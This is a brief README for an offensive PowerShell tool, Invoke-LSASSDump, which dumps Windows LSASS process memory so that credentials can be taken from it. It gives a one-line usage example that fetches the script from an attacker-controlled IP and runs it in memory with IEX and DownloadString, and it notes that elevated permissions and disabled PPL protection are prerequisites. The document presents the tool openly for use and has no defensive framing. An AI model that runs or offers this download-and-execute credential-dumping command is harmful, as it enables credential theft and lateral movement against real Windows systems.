# Invoke-LSASSDump
A small script to dump the LSASS process via PowerShell. 

# Example

Once we have enough permissions and PPL disabled (if need be), we can invoke the following and a **.dmp** file of the LSASS process will be created in the C:\Windows\Tasks folder:

```
PS > IEX ((New-Object System.Net.WebClient).DownloadString('http://<YOUR IP>/Invoke-LSASSDump.ps1'))
```

The script returns a boolean value of *True* if the LSASS process has been dumped.
